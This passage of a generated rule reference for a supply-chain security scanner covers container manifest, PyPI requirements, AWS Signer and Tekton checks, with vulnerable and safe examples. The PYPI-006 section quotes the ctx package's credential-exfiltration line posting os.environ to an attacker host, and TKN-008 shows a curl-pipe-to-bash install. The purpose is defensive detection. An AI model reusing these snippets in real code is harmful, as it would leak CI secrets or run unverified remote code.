**Recommendation.** Rebuild and re-push the image with a current builder (``docker buildx build`` / ``buildah`` / ``ko``) so the registry produces a v2 manifest with content-addressed layer descriptors. Docker Distribution v1 manifests predate the digest-pinned design that lets a client verify a pulled blob matches the manifest the registry served, so a v1 pull has no way to detect tampering between the registry and the runtime. Registries have been refusing v1 pushes for years (Docker Hub since 2019, GHCR / quay.io / ECR / Artifact Registry never supported them on read), but a pre-existing v1 image can still be sitting in a private registry; the rule catches it before that image gets promoted.

**Known false positives.**

- Some internal Harbor / Nexus deployments still proxy legacy Docker images that haven't been rebuilt; a pull succeeds because the proxy upgrades the manifest at request time, but the on-disk JSON if you saved it with ``inspect --raw`` may still report the original schemaVersion. If your registry is doing this in-flight promotion you can suppress; otherwise re-run the build.

**Proof of exploit.**

```
# Vulnerable: ``schemaVersion: 1`` predates the digest-
# pinned design. The client has no way to verify that the
# pulled blobs match what the registry served; a swapped
# blob is silently accepted. Modern registries refuse v1
# pushes, but a pre-existing v1 image in a private
# registry stays pullable and unverified.
{
  "schemaVersion": 1,
  "name": "myorg/legacy-app",
  "tag": "latest",
  "architecture": "amd64",
  "fsLayers": [
    { "blobSum": "sha256:abc123..." }
  ],
  "history": [
    { "v1Compatibility": "..." }
  ]
}

# Safe: rebuild with a current builder (``docker buildx
# build`` / ``buildah`` / ``ko``). The registry produces a
# v2 manifest with content-addressed layer descriptors and
# a ``config`` descriptor that pins the image config by
# digest.
{
  "schemaVersion": 2,
  "mediaType": "application/vnd.oci.image.manifest.v1+json",
  "config": {
    "mediaType": "application/vnd.oci.image.config.v1+json",
    "digest": "sha256:config-digest...",
    "size": 7023
  },
  "layers": [
    {
      "mediaType": "application/vnd.oci.image.layer.v1.tar+gzip",
      "digest": "sha256:layer-digest...",
      "size": 32654
    }
  ]
}
```

**Source:** [`OCI-007`](../providers/oci.md#oci-007) in the [OCI manifest provider](../providers/oci.md).

### `OCI-008`: Manifest references digest using unsupported hash algorithm <span class="pg-sev pg-sev--high">HIGH</span> { #detail-oci-008 }

**Evidences:** [`UPD-1`](#ctrl-upd-1) L1: Update vulnerable OSS manually (pin + track versions).

**How this is detected.** The OCI image-spec mandates ``sha256:`` or ``sha512:`` for content descriptors. ``sha1:`` and ``md5:`` were never permitted by the spec but show up occasionally in mirror exports and forensic JSON; this rule catches them.

Detection scope: the config descriptor digest, every layer descriptor digest (single-image manifests), and every sub-manifest entry digest in an image index. The matcher accepts ``sha256:`` and ``sha512:`` as the only valid prefixes; anything else fires.

**Recommendation.** Rebuild and re-push the image so every descriptor (config, layers, sub-manifest entries) carries a ``sha256:`` digest. ``sha512:`` is also acceptable per the OCI spec, but anything weaker (md5, sha1) breaks the integrity guarantee the registry pull is supposed to provide. sha1 has had practical collisions since SHAttered (2017); md5 has had them since the early 2000s. A manifest that pins a layer by sha1 lets an attacker who can produce a colliding blob substitute a different tarball without changing the manifest, the registry's content-addressing then ratifies the substitution.

**Known false positives.**

- Test fixtures and intentionally-corrupt CTF images sometimes use degraded hashes for pedagogical reasons. Suppress on the specific path with an ignore-file when this is the deliberate shape.

**Proof of exploit.**

```
# Vulnerable: descriptors pin layers by ``sha1:`` digest.
# sha1 has had practical collisions since SHAttered (2017).
# An attacker who produces a colliding blob substitutes a
# different tarball without changing the manifest; the
# registry's content-addressing then ratifies the swap.
{
  "schemaVersion": 2,
  "mediaType": "application/vnd.oci.image.manifest.v1+json",
  "config": {
    "mediaType": "application/vnd.oci.image.config.v1+json",
    "digest": "sha1:abc1234567890abcdef1234567890abcdef12345",
    "size": 7023
  },
  "layers": [
    {
      "mediaType": "application/vnd.oci.image.layer.v1.tar+gzip",
      "digest": "sha1:def4567890abcdef1234567890abcdef123456",
      "size": 32654
    }
  ]
}

# Safe: every descriptor uses ``sha256:`` (or ``sha512:``,
# also OCI-permitted). The 256-bit hash space rules out
# birthday-attack collisions at any plausibly-buildable
# scale; a substituted blob cannot match the recorded
# digest.
{
  "schemaVersion": 2,
  "mediaType": "application/vnd.oci.image.manifest.v1+json",
  "config": {
    "mediaType": "application/vnd.oci.image.config.v1+json",
    "digest": "sha256:abc123def456abc123def456abc123def456abc123def456abc123def456abc1",
    "size": 7023
  },
  "layers": [
    {
      "mediaType": "application/vnd.oci.image.layer.v1.tar+gzip",
      "digest": "sha256:def456abc123def456abc123def456abc123def456abc123def456abc123def4",
      "size": 32654
    }
  ]
}
```

**Source:** [`OCI-008`](../providers/oci.md#oci-008) in the [OCI manifest provider](../providers/oci.md).

### `PYPI-001`: requirements.txt entry missing an exact version pin <span class="pg-sev pg-sev--medium">MEDIUM</span> { #detail-pypi-001 }

**Evidences:** [`UPD-1`](#ctrl-upd-1) L1: Update vulnerable OSS manually (pin + track versions).

**How this is detected.** Fires on any requirement that does not use ``==`` to pin a single version, including:

* Bare names (``requests``)
* Range specifiers (``django>=4,<5``, ``urllib3~=2.0``)
* Lone upper-bound (``packaging<24``)

Skips VCS specs (``git+https://...``), URL specs (``https://example.com/foo.tar.gz``), editable installs (``-e .``), and local paths (``./packages/foo``) — those have different pinning shapes and are handled by PYPI-004 or fall outside the version-pinning surface. Complements PYPI-002 (hash pinning) and PYPI-004 (VCS commit pin); PYPI-001 is the version-name layer.

**Recommendation.** Pin every requirement to an exact version (``foo==1.2.3``). Range specifiers (``>=``, ``~=``, ``<``) and unpinned names let pip pick a later release on the next install, so a compromised patch version (PyTorch typosquat, ctx package, request-PR worm) reaches the build without a code change. Generate the file with ``pip-compile`` to lock the full transitive set, and pair the pin with ``--require-hashes`` (PYPI-002) so the lock is verified at install time.

**Known false positives.**

- Files that are pip-tools *inputs* (``requirements.in``) carry unpinned ranges by design, the resolved ``*.txt`` is the artifact pip installs. If you're scanning a ``*.in`` file intentionally, suppress with a rationale naming the compiled output.

**Source:** [`PYPI-001`](../providers/pypi.md) in the [PyPI provider](../providers/pypi.md).

### `PYPI-002`: requirements.txt missing hash pinning (--require-hashes / --hash=) <span class="pg-sev pg-sev--high">HIGH</span> { #detail-pypi-002 }

**Evidences:** [`UPD-1`](#ctrl-upd-1) L1: Update vulnerable OSS manually (pin + track versions).

**How this is detected.** Fires when:

* The file does not declare ``--require-hashes`` at the top, AND
* At least one requirement line is missing a ``--hash=...`` flag.

When ``--require-hashes`` is present, pip enforces hash pinning for every requirement and itself refuses the install if any line is missing a ``--hash``; the rule still flags any line that visibly lacks the flag so the doc reader sees the actual coverage. ``*.in`` (pip-tools input) files are exempt — they're declarative inputs, the compiled ``*.txt`` is the hash-bearing artifact pip installs. Complements PYPI-001 (version pin); PYPI-002 is the layer that catches an attacker swapping the artifact even when the version literal is unchanged.

**Recommendation.** Regenerate the file with ``pip-compile --generate-hashes`` (pip-tools) or ``pip hash`` and add ``--require-hashes`` at the top. Every requirement line then carries one or more ``--hash=sha256:...`` entries pinning the artifact bytes pip downloads. ``--require-hashes`` forces pip to refuse installs that don't match, closing the window where a compromised registry (or a malicious mirror, or a MITM on an internal proxy) swaps the tarball/wheel without your lockfile changing.

**Known false positives.**

- Files generated by ``poetry export`` historically wrote hashes without ``--require-hashes`` at the top, which looks unpinned but is enforced by Poetry's own resolver in CI. Add the top-level ``--require-hashes`` to the exported file (or replace ``poetry export`` with ``pip-compile --generate-hashes``) so the requirements file is self-describing.

**Seen in the wild.**

- PyTorch dependency confusion (December 2022): the ``torchtriton`` name on PyPI was claimed by a malicious publisher and pulled in via a nightly build, exfiltrating SSH keys and ``/etc/passwd``. Hash pinning would have rejected the unexpected artifact regardless of which registry resolved the name.

**Proof of exploit.**

```
# Vulnerable: requirements.txt pins the version literal
# but doesn't pin the artifact bytes. A registry that
# silently re-publishes ``requests-2.31.0`` with a
# backdoored wheel (publisher takeover, mirror compromise,
# MITM on an internal proxy) ships unverified code on the
# next ``pip install``. Even ``--require-hashes`` doesn't
# fire because the file doesn't declare it.
# requirements.txt
requests==2.31.0
urllib3==2.0.7
certifi==2024.2.2

# Safe: regenerate with ``pip-compile --generate-hashes``
# (pip-tools). Every line carries a ``--hash=sha256:...``
# for the wheel and the sdist; ``--require-hashes`` at
# the top makes pip refuse the install on any mismatch
# or unhashed line.
# requirements.txt
--require-hashes
requests==2.31.0 \
    --hash=sha256:942c5a758f98d790eaed1a29cb6eefc7ffb0d1cf7af05c3d2791656dbd6ad1e1 \
    --hash=sha256:58cd2187c01e70e6e26505bca751777aa9f2ee0b7f4300988b709f44e013003f
urllib3==2.0.7 \
    --hash=sha256:c97dfde1f7bd43a71c8d2a58e369e9b2bf692d1334ea9f9cae55add7d0dd0f84
certifi==2024.2.2 \
    --hash=sha256:0569859f95fc761b18b45ef421b1290a0f65f147e92a1e5eb3e635f9a5e4e66f
```

**Source:** [`PYPI-002`](../providers/pypi.md) in the [PyPI provider](../providers/pypi.md).

### `PYPI-003`: requirements.txt uses an HTTP index or disables TLS verification <span class="pg-sev pg-sev--high">HIGH</span> { #detail-pypi-003 }

**Evidences:** [`ING-1`](#ctrl-ing-1) L1: Use package managers trusted by your organization.

**How this is detected.** Fires when the file's top-level options include:

* ``--index-url http://...`` / ``-i http://...``
* ``--extra-index-url http://...``
* ``--trusted-host <host>``

Complements DF-021 (Dockerfile ``RUN pip install ``-i http://...``); PYPI-003 catches the same pattern when it's baked into the requirements file rather than the shell command. Note ``--trusted-host`` also weakens PYPI-002 — pip silently skips hash checking for the trusted host even when ``--require-hashes`` is set.

**Recommendation.** Switch ``--index-url`` and ``--extra-index-url`` to ``https://`` and remove ``--trusted-host``. If your internal index has a self-signed certificate, install the CA into the build environment's truststore (or pass ``PIP_CERT=/path/to/ca.pem``) instead of telling pip to skip verification. ``--trusted-host`` disables TLS verification *and* hash verification for the named host, so anyone on the network path can swap the wheel.

**Proof of exploit.**

```
# Vulnerable: pip resolves every package against a
# plaintext-HTTP index. Any network attacker between the
# build runner and the index (compromised corporate proxy,
# malicious VPN exit, BGP hijack on the internal mirror)
# swaps the wheel in flight. ``--trusted-host`` is worse:
# pip then SKIPS hash verification for that host, so even
# a ``--require-hashes`` file installs unverified bytes.
# requirements.txt
--index-url http://internal-pypi.example.com/simple
--trusted-host internal-pypi.example.com
requests==2.31.0

# Safe: HTTPS with the index's certificate validated. For
# an internal index on a private CA, install the CA into
# the agent trust store or pass ``PIP_CERT=/path/to/ca.pem``
# — never ``--trusted-host``. Hashes stay enforced.
# requirements.txt
--index-url https://internal-pypi.example.com/simple
--require-hashes
requests==2.31.0 \
    --hash=sha256:942c5a758f98d790eaed1a29cb6eefc7ffb0d1cf7af05c3d2791656dbd6ad1e1
```

**Source:** [`PYPI-003`](../providers/pypi.md) in the [PyPI provider](../providers/pypi.md).

### `PYPI-004`: requirements.txt VCS dependency uses a mutable ref <span class="pg-sev pg-sev--high">HIGH</span> { #detail-pypi-004 }

**Evidences:** [`UPD-1`](#ctrl-upd-1) L1: Update vulnerable OSS manually (pin + track versions).

**How this is detected.** Fires on requirement lines whose URL is a VCS scheme (``git+https://``, ``git+ssh://``, ``hg+``, ``svn+``, ``bzr+``) and whose ``@<ref>`` segment is not a 40-character SHA. A line with no ``@<ref>`` at all also fires — that resolves to the default branch HEAD, the most mutable form. Note: ``foo @ git+https://...`` (PEP 508 direct URL) and ``-e git+https://...#egg=foo`` (legacy editable install) are both detected.

**Recommendation.** Pin VCS requirements to a 40-character commit SHA: ``foo @ git+https://github.com/owner/repo.git@<sha>`` (or the legacy ``-e git+...@<sha>#egg=foo`` form). Branch and tag refs (``@main``, ``@v1.2.3``) are mutable, anyone with push access to the upstream repo can swap the contents of what your build pulls without changing the requirement line. A 40-char SHA is immutable. If the upstream isn't yours, prefer vendoring a fork into a private index and pinning by version + hash (PYPI-001 / PYPI-002).

**Proof of exploit.**

```
# Vulnerable: every ``pip install -r requirements.txt``
# resolves ``@main`` against the upstream repo. Whoever
# can push to ``main`` (legitimate co-maintainer, leaked
# PAT, account compromise on the upstream owner) ships
# code into your build silently. Tag refs like ``@v1.2.3``
# are barely better — git tags are mutable on the upstream
# side and can be force-pushed at any time.
# requirements.txt
shared-utils @ git+https://github.com/myorg/shared-utils.git@main
-e git+https://github.com/myorg/legacy.git@v1.2.3#egg=legacy

# Safe: pin to a 40-character commit SHA. The git object
# is immutable — a re-push under the same SHA fails the
# hash check on fetch. Renovate / Dependabot's pip-vcs
# ecosystem updaters bump these in reviewable PRs.
# requirements.txt
shared-utils @ git+https://github.com/myorg/shared-utils.git@0123456789abcdef0123456789abcdef01234567
-e git+https://github.com/myorg/legacy.git@fedcba9876543210fedcba9876543210fedcba98#egg=legacy
```

**Source:** [`PYPI-004`](../providers/pypi.md) in the [PyPI provider](../providers/pypi.md).

### `PYPI-005`: requirements.txt declares --extra-index-url (dependency-confusion surface) <span class="pg-sev pg-sev--high">HIGH</span> { #detail-pypi-005 }

**Evidences:** [`ING-1`](#ctrl-ing-1) L1: Use package managers trusted by your organization.

**How this is detected.** Fires when the file declares ``--extra-index-url`` at any level. The flag itself is the anti-pattern, the URL value doesn't matter, pip will query both the primary and the extra index for every package and pick the higher version. An attacker who registers a public PyPI package with the same name as an internal-only dependency wins the version comparison and ships their code into the build.

If the extra index is a hash-locked internal proxy that serves *both* internal and mirrored-public packages, consolidating it into the primary ``--index-url`` removes the surface without losing any capability. Suppress with a rationale only when both indexes share an operator-controlled allow-list of names.

**Recommendation.** Replace ``--extra-index-url`` with a single ``--index-url`` pointing at the index you actually want (an internal proxy or a curated private index), and configure that index to transparently mirror PyPI for any package not published internally. With ``--extra-index-url``, pip queries *both* indexes for every name and picks the highest version — so a public PyPI publisher who registers your internal package name (``acme-internal``) with a higher version wins the resolution. The single-index pattern eliminates the dependency-confusion vector entirely.

**Seen in the wild.**

- Alex Birsan, "Dependency Confusion: How I Hacked Into Apple, Microsoft and Dozens of Other Companies" (2021): internal package names harvested from public-facing manifests were registered on public PyPI / npm with higher version numbers; victim builds that declared the public index as an extra automatically pulled the attacker's package on the next install.
- PyTorch ``torchtriton`` (December 2022): a typosquat name on PyPI's public index was preferred over the internal nightly build, exfiltrating SSH keys via a postinstall step. Single-index installations were unaffected.

**Proof of exploit.**

```
# Vulnerable: pip queries BOTH indexes for every package
# name and picks the highest version. ``acme-internal`` is
# an internal-only package the org publishes to the
# private index. An attacker registers ``acme-internal``
# on public PyPI with version ``99.0.0``; the next ``pip
# install`` resolves to the attacker's wheel because
# 99.0.0 > 1.2.3. This is the Birsan dependency-confusion
# class — Apple / Microsoft / Yelp / Tesla / Uber all paid
# Birsan a bounty for this exact shape.
# requirements.txt
--index-url https://internal-pypi.example.com/simple
--extra-index-url https://pypi.org/simple
acme-internal==1.2.3
requests==2.31.0

# Safe: single index. Configure the internal proxy to
# transparently mirror PyPI for any name not published
# internally; pip then resolves every package against ONE
# source whose name allow-list the operator controls.
# requirements.txt
--index-url https://internal-pypi.example.com/simple
acme-internal==1.2.3
requests==2.31.0
```

**Source:** [`PYPI-005`](../providers/pypi.md) in the [PyPI provider](../providers/pypi.md).

### `PYPI-006`: requirements.txt pins a known-compromised PyPI package version <span class="pg-sev pg-sev--critical">CRITICAL</span> { #detail-pypi-006 }

**Evidences:** [`ING-3`](#ctrl-ing-3) L1: Have the capability to deny-list specific vulnerable / malicious OSS, [`SCA-3`](#ctrl-sca-3) L2: Scan OSS for malware.

**How this is detected.** Walks every ``name==version`` line in the requirements file against the curated compromised-package registry in ``pipeline_check.core.checks.pypi._compromised_packages``. Name matching follows PEP 503 normalization (lowercase, underscore/dot folded to hyphen) so ``Pillow``, ``pillow``, and ``Pil_Low`` resolve to the same registry entry. Lines without an exact ``==`` pin can't be evaluated by this rule (the version literal isn't decidable from the file alone); those are PYPI-001's surface. VCS URLs and local / editable installs are skipped — they don't carry a registry-resolvable version. Registry is hand-curated and append-only; refresh by PR with the citing advisory.

**Recommendation.** Rotate every secret reachable to any process that ran ``pip install`` against this requirements file during the window the compromised version was installed (AWS keys, GH tokens, SSH keys — most published PyPI compromises have been credential stealers). Bump the affected requirement to a post-incident clean version published after the maintainer / PyPI took down the malicious release, and audit CI logs for the exfiltration shape the advisory documents. Pair with PYPI-002 (``--require-hashes``) so a future swap of the same version literal fails verification.

**Known false positives.**

- The registry covers only public, advisory-confirmed compromises. Pre-disclosure compromises and yet-unpublished maintainer-account takeovers do not land until the citing advisory exists. For broader coverage, run ``pip-audit`` or ``osv-scanner`` alongside pipeline-check; PYPI-006 is the curated supply-chain anchor, not a vulnerability database.

**Seen in the wild.**

- ctx package compromise (May 2022): the abandoned ``ctx`` package was claimed by an attacker and republished with an env-var exfiltration payload targeting AWS keys / GitHub tokens. https://isc.sans.edu/diary/28772
- requests-darwin-lite 2.27.1 ([GHSA-7gjg-3qcj-9jvg](https://github.com/advisories/GHSA-7gjg-3qcj-9jvg), May 2024): typosquat-flavored package whose wheel embedded the Geneva malware framework.

**Proof of exploit.**

```
# Vulnerable: requirements.txt pins a compromised version.
ctx==0.2.2

# Attack: ctx 0.2.2 carries a postinstall-equivalent at
# wheel install time that exfiltrates the environment to
# an attacker endpoint:
#   import os, requests
#   requests.post('https://<attacker>/c',
#                 data=json.dumps(dict(os.environ)))
# AWS_ACCESS_KEY_ID, AWS_SECRET_ACCESS_KEY, GITHUB_TOKEN,
# and every other CI-env credential go out in one POST.

# Safe: do not install ctx 0.2.2-0.2.8; if you genuinely
# need a ``ctx``-named package, vendor a fork at a known-
# good revision into a private index and pin by hash
# (PYPI-002).
```

**Source:** [`PYPI-006`](../providers/pypi.md) in the [PyPI provider](../providers/pypi.md).

### `SIGN-001`: No AWS Signer profile defined for Lambda deploys <span class="pg-sev pg-sev--medium">MEDIUM</span> { #detail-sign-001 }

**Evidences:** [`REB-2`](#ctrl-reb-2) L4: Digitally sign rebuilt / produced OSS artifacts.

**How this is detected.** AWS Signer profiles are the upstream of LMB-001's code-signing config. Without a profile defined, no function in the account can enforce code-signing, LMB-001's recommendation has nothing to point at. The profile is the foundation; the per-function code-signing config attaches it.

**Recommendation.** Create an AWS Signer profile with platform ``AWSLambda-SHA384-ECDSA`` and reference it from every Lambda code-signing config used by the pipeline. Without a profile, LMB-001 remediation isn't possible and release artifacts can't be signed at build time.

**Source:** [`SIGN-001`](../providers/aws.md) in the [AWS provider](../providers/aws.md).

### `SIGN-002`: AWS Signer profile is revoked or inactive <span class="pg-sev pg-sev--high">HIGH</span> { #detail-sign-002 }

**Evidences:** [`REB-2`](#ctrl-reb-2) L4: Digitally sign rebuilt / produced OSS artifacts.

**How this is detected.** A revoked or canceled Signer profile invalidates every signature it ever produced. Lambda functions configured to enforce code-signing fail to deploy until the profile is replaced (or, if ``UntrustedArtifactOnDeployment = Warn``, deploy with a CloudWatch warning the operator rarely reads).

**Recommendation.** Rotate the signing profile: create a replacement and update every code-signing config that references the revoked profile. A revoked or canceled profile invalidates every signature it produced, lambdas relying on it will fail verification.

**Source:** [`SIGN-002`](../providers/aws.md) in the [AWS provider](../providers/aws.md).

### `TKN-001`: Tekton step image not pinned to a digest <span class="pg-sev pg-sev--high">HIGH</span> { #detail-tkn-001 }

**Evidences:** [`UPD-1`](#ctrl-upd-1) L1: Update vulnerable OSS manually (pin + track versions).

**How this is detected.** Applies to ``Task`` and ``ClusterTask`` kinds. The image must contain ``@sha256:`` followed by a 64-char hex digest. Any tag-only reference, including ``:latest``, fails.

**Recommendation.** Pin every step image to a content-addressable digest (``gcr.io/tekton-releases/git-init@sha256:<digest>``). Tag-only references (``alpine:3.18``) and rolling tags (``alpine:latest``) let a compromised registry update redirect the step at the next pull, with no audit trail in the Task manifest.

**Proof of exploit.**

```
# Vulnerable: ``ubuntu:22.04`` is a mutable tag. Whoever
# controls the registry can repoint it on the next 22.04.x
# refresh; the next TaskRun pulls the swap silently.
apiVersion: tekton.dev/v1
kind: Task
metadata: { name: build }
spec:
  steps:
    - name: compile
      image: ubuntu:22.04
      script: |
        make build

# Safe: pin to the immutable sha256 digest. The leading
# comment documents which tag the digest corresponds to.
apiVersion: tekton.dev/v1
kind: Task
metadata: { name: build }
spec:
  steps:
    - name: compile
      image: ubuntu@sha256:abc123...  # ubuntu:22.04, refreshed YYYY-MM-DD
      script: |
        make build
```

**Source:** [`TKN-001`](../providers/tekton.md#tkn-001) in the [Tekton provider](../providers/tekton.md).

### `TKN-008`: Tekton step script pipes remote install or disables TLS <span class="pg-sev pg-sev--high">HIGH</span> <span class="pg-fix" title="`--fix` will patch this rule">🔧 fix</span> { #detail-tkn-008 }

**Evidences:** [`ING-1`](#ctrl-ing-1) L1: Use package managers trusted by your organization.

**How this is detected.** Uses the cross-provider ``_primitives.remote_script_exec`` and ``_primitives.tls_bypass`` detectors so detection is consistent with the GHA / GitLab / CircleCI / Cloud Build providers (covering helm / kubectl / ssh / docker / maven / gradle / aws bypasses in addition to the curl / wget / git / npm / pip baseline).

**Recommendation.** Replace ``curl ... | sh`` with a download-then-verify-then-execute pattern. Drop TLS-bypass flags (``curl -k``, ``git config http.sslverify false``); install the missing CA into the step image instead. Both forms let an attacker controlling DNS / a transparent proxy substitute the script the step runs.

**Autofix.** `pipeline_check --fix` will patch this finding automatically. Review the diff before committing; the fixer applies the conservative remediation pattern (e.g. swap a floating tag for the digest it currently resolves to), not the most aggressive one.

**Known false positives.**

- Tasks running entirely against an internal mirror (``curl https://internal-mirror/install.sh | sh`` where the mirror is the same supply chain as the task image itself) carry less marginal risk than a public-internet fetch, but the rule still fires because the curl-pipe primitive is the structural signal. ``curl -k`` to a TLS endpoint with a known self-signed CA likewise triggers; the canonical fix is to install the CA into the step image and drop ``-k``, but per-task suppression via ``--ignore-file`` is the escape hatch.

**Proof of exploit.**

```
# Vulnerable: ``curl | bash`` trusts the network path AND
# the installer host. A MITM (compromised proxy, malicious
# DNS) or a publisher compromise ships malicious code into
# the step's shell with the step's full credential set
# in scope (TaskRun ServiceAccount, mounted Secrets).
apiVersion: tekton.dev/v1
kind: Task
spec:
  steps:
    - name: install-cli
      image: alpine@sha256:abc123...
      script: |
        curl -fsSL https://installer.example.com/cli.sh | bash

# Safe: download, verify against a known-good sha256, then
# execute. If the upstream content changes, the digest
# stops matching and the step fails loud.
apiVersion: tekton.dev/v1
kind: Task
spec:
  steps:
    - name: install-cli
      image: alpine@sha256:abc123...
      script: |
        set -e
        curl -fsSL https://installer.example.com/cli.sh -o /tmp/cli.sh
        echo 'a1b2c3d4...  /tmp/cli.sh' | sha256sum -c -
        bash /tmp/cli.sh
```

**Source:** [`TKN-008`](../providers/tekton.md#tkn-008) in the [Tekton provider](../providers/tekton.md).

### `TKN-009`: Artifacts not signed (no cosign/sigstore step) <span class="pg-sev pg-sev--medium">MEDIUM</span> { #detail-tkn-009 }

**Evidences:** [`REB-2`](#ctrl-reb-2) L4: Digitally sign rebuilt / produced OSS artifacts.

**How this is detected.** Detection mirrors GHA-006 / BK-009 / CC-006, the shared signing-token catalog (cosign, sigstore, slsa-github-generator, slsa-framework, notation-sign) is searched across every string in the Task / Pipeline document. The rule only fires on artifact-producing Tasks (those that invoke ``docker build`` / ``docker push`` / ``buildah`` / ``kaniko`` / ``helm upgrade`` / ``aws s3 sync`` / etc.) so lint-only Tasks don't trip it.

**Recommendation.** Add a signing step to the Task, either a dedicated ``cosign sign`` step after the build, or use the official ``cosign`` Tekton catalog Task as a referenced step. The Task should sign by digest (``cosign sign --yes <repo>@sha256:<digest>``) so a re-pushed tag can't bypass the signature.

**Source:** [`TKN-009`](../providers/tekton.md#tkn-009) in the [Tekton provider](../providers/tekton.md).

### `TKN-010`: No SBOM generated for build artifacts <span class="pg-sev pg-sev--medium">MEDIUM</span> { #detail-tkn-010 }

**Evidences:** [`REB-3`](#ctrl-reb-3) L4: Generate SBOMs for artifacts produced.

**How this is detected.** An SBOM (CycloneDX or SPDX) records every component baked into the build. Without one, post-incident triage can't answer ``did this CVE ship?`` for a given artifact. Detection uses the shared SBOM-token catalog: syft, cyclonedx, cdxgen, spdx-tools, microsoft/sbom-tool. Fires only on artifact-producing Tasks.

**Recommendation.** Add an SBOM-generation step. ``syft <artifact> -o cyclonedx-json > $(workspaces.output.path)/sbom.json`` runs in the official ``syft`` Tekton catalog Task. ``cyclonedx-cli`` and ``cdxgen`` are alternatives. Publish the SBOM as a Workspace result so downstream Tasks can consume it.

**Source:** [`TKN-010`](../providers/tekton.md#tkn-010) in the [Tekton provider](../providers/tekton.md).

### `TKN-011`: No SLSA provenance attestation produced <span class="pg-sev pg-sev--medium">MEDIUM</span> { #detail-tkn-011 }

**Evidences:** [`REB-4`](#ctrl-reb-4) L4: Digitally sign SBOMs produced (attested provenance).

**How this is detected.** Provenance generation is distinct from signing. A signed artifact proves *who* published it; a provenance attestation proves *where / how* it was built. Tekton Chains is the Tekton-native answer, once enabled on the cluster, every TaskRun's outputs are signed and attested without per-Task wiring. Detection uses the shared provenance-token catalog (``slsa-framework``, ``cosign attest``, ``in-toto``, ``attest-build-provenance``, ``witness run``). Tasks produced by tekton-chains pass on the ``cosign attest`` match.

**Recommendation.** After the build step, run ``cosign attest --predicate slsa.json --type slsaprovenance <ref>`` (or use the ``tekton-chains`` controller, which signs and attests every TaskRun automatically when configured). Publish the attestation alongside the artifact so consumers can verify *how* it was built, not just *who* signed it.

**Source:** [`TKN-011`](../providers/tekton.md#tkn-011) in the [Tekton provider](../providers/tekton.md).

### `TKN-012`: No vulnerability scanning step <span class="pg-sev pg-sev--medium">MEDIUM</span> { #detail-tkn-012 }

**Evidences:** [`SCA-1`](#ctrl-sca-1) L1: Scan OSS for known vulnerabilities.

**How this is detected.** Vulnerability scanning sits at a different layer from signing and SBOM. It answers *does this artifact ship a known CVE?* rather than *can we verify what it is?*. Detection uses the shared vuln-scan-token catalog: trivy, grype, snyk, npm-audit, pip-audit, osv-scanner, govulncheck, anchore, codeql-action, semgrep, bandit, checkov, tfsec, dependency-check. Walks every Task / Pipeline / *Run document; passes if any document includes a scanner reference.

**Recommendation.** Add a vulnerability scanner step. ``trivy fs $(workspaces.src.path)`` for source / filesystem; ``trivy image <ref>`` for container images. The official Tekton catalog ships ``trivy-scanner`` and ``grype-scanner`` Tasks if you'd rather reference one. Fail the step on findings above a chosen severity so a regression blocks the merge instead of shipping.

**Source:** [`TKN-012`](../providers/tekton.md#tkn-012) in the [Tekton provider](../providers/tekton.md).

---

_This page is generated. Edit `pipeline_check/core/standards/data/s2c2f.py` (mappings) or `scripts/gen_standards_docs.py` (intro / per-control prose) and run `python scripts/gen_standards_docs.py s2c2f`._
